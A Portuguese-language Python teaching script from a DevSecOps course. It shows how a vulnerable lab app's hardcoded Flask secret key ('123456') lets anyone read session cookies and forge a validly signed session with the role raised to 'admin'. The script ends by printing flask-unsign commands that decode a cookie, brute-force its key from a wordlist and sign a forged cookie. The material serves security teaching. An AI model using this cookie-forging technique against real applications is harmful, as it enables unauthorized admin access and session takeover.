"""
Aula 3 - Gestao de Identidades, Autenticacao e Autorizacao
Script complementar a demonstracao ao vivo do Video 3 (devsecops-lab).

Objetivo: mostrar, de forma isolada e sem precisar do servidor Flask
rodando, exatamente como a secret key hardcoded e fraca do
devsecops-lab/config.py (SECRET_KEY = "123456") permite forjar uma
sessao inteira - o mesmo mecanismo que a ferramenta flask-unsign usa
por baixo dos panos, e que e demonstrado ao vivo no roteiro de gravacao.

Om Flask, um cookie de sessao NAO e criptografado - ele e um payload em
Base64 (legivel por qualquer pessoa) mais uma assinatura HMAC calculada
com a secret key da aplicacao. Alguem so consegue MODIFICAR o conteudo
do cookie e gerar uma assinatura valida se souber a chave. O problema no
devsecops-lab e que essa chave e "123456": curta, previsivel, e escrita
direto no codigo-fonte.

Requer Flask instalado (ja e dependencia do devsecops-lab):
    pip install -r ../../devsecops-lab/requirements.txt

Para rodar:
    python forjar_sessao.py
"""

import base64
import hashlib

from itsdangerous import URLSafeTimedSerializer, BadSignature
from flask.sessions import TaggedJSONSerializer

# Mesma chave hardcoded de devsecops-lab/config.py (SECRET_KEY = "123456").
# Repetida aqui apenas para o script funcionar sozinho, sem depender do
# resto do repositorio.
SECRET_KEY_DO_LAB = "123456"


def criar_serializer(chave: str) -> URLSafeTimedSerializer:
    """Recria o mesmo esquema de assinatura que o Flask usa para cookies
    de sessao (salt "cookie-session", serializer com suporte a tipos
    Python via TaggedJSONSerializer, HMAC-SHA1)."""

    return URLSafeTimedSerializer(
        chave,
        salt="cookie-session",
        serializer=TaggedJSONSerializer(),
        signer_kwargs=dict(key_derivation="hmac", digest_method=hashlib.sha1),
    )


def decodificar_payload_sem_chave(cookie: str) -> bytes:
    """Le o conteudo do cookie SEM precisar da secret key - prova de que
    nao e criptografia, e sim so codificacao (Base64) mais assinatura."""

    payload_b64 = cookie.split(".")[0]
    payload_b64 += "=" * (-len(payload_b64) % 4)  # repor padding do Base64
    return base64.urlsafe_b64decode(payload_b64)


if __name__ == "__main__":

    serializer_correto = criar_serializer(SECRET_KEY_DO_LAB)

    # 1) Um cookie legitimo, como o Flask geraria apos um login normal
    #    (routes/auth.py faz session["usuario"] = ...; session["perfil"] = ...)
    cookie_legitimo = serializer_correto.dumps({"usuario": "joao", "perfil": "aluno"})
    print("1) Cookie legitimo (apos login normal como 'joao'):")
    print("  ", cookie_legitimo)
    print()

    # 2) Decodificar o payload SEM saber a chave - qualquer pessoa consegue
    print("2) Payload decodificado, sem precisar da secret key:")
    print("  ", decodificar_payload_sem_chave(cookie_legitimo))
    print("   -> nao e criptografia: o conteudo e legivel por qualquer um.")
    print()

    # 3) Tentar validar o cookie com uma chave ERRADA - a assinatura falha
    serializer_chave_errada = criar_serializer("uma-chave-qualquer-diferente")
    print("3) Tentando validar o cookie com uma chave DIFERENTE da correta:")
    try:
        serializer_chave_errada.loads(cookie_legitimo)
        print("   -> nao deveria ter chegado aqui!")
    except BadSignature:
        print("   -> BadSignature: sem a chave certa, o Flask rejeita o cookie.")
    print()

    # 4) Mas a chave do devsecops-lab e fraca e esta hardcoded em config.py.
    #    Quem tem acesso ao codigo-fonte (ou adivinha "123456") consegue
    #    reassinar um payload novo, do jeito que quiser.
    cookie_forjado = serializer_correto.dumps({"usuario": "joao", "perfil": "admin"})
    print('4) Forjando um cookie novo com a chave conhecida ("123456"),')
    print("   com o perfil elevado para 'admin', sem nunca ter feito login:")
    print("  ", cookie_forjado)
    print()

    # 5) O servidor aceita o cookie forjado normalmente - a assinatura bate
    resultado = serializer_correto.loads(cookie_forjado)
    print("5) O servidor decodifica e ACEITA o cookie forjado, sem reclamar:")
    print("  ", resultado)
    print("   -> sessao completa, forjada, sem passar pela rota /autenticar.")
    print()

    print("=" * 70)
    print()
    print("Os mesmos passos, com a ferramenta flask-unsign (usada ao vivo")
    print("no roteiro de gravacao, contra um cookie real do navegador):")
    print()
    print("  flask-unsign --decode --cookie \"<cookie copiado do navegador>\"")
    print("  flask-unsign --unsign --cookie \"<cookie>\" --wordlist wordlist.txt")
    print("  flask-unsign --sign --cookie \"{'usuario': 'joao', 'perfil': 'admin'}\" --secret '123456'")
